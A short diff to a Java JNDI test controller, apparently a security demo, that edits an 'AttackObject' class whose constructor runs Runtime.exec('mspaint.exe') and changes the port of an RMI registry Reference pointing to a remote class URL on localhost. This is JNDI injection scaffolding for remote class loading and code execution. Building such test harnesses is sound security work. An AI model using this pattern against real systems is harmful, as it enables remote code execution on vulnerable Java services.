@@ -79,6 +79,7 @@ public class JNDITestController {
 
     public static class AttackObject implements Serializable {
         public AttackObject() throws Exception {
+            System.out.println("AttackObject");
             Runtime.getRuntime().exec("mspaint.exe");
         }
     }
@@ -101,7 +102,7 @@ public class JNDITestController {
         RemoteTask remoteTask = new RemoteTask();
         UnicastRemoteObject.exportObject(remoteTask, 0);
         LocalTask localTask = new LocalTask();
-        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/JNDI/AttackObject.class");
+        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8090/JNDI/AttackObject.class");
         ReferenceWrapper attackObjectWrapper = new ReferenceWrapper(attackObject);
         Registry registry = LocateRegistry.createRegistry(registryPort);
         logger.info("registry : " + registry);
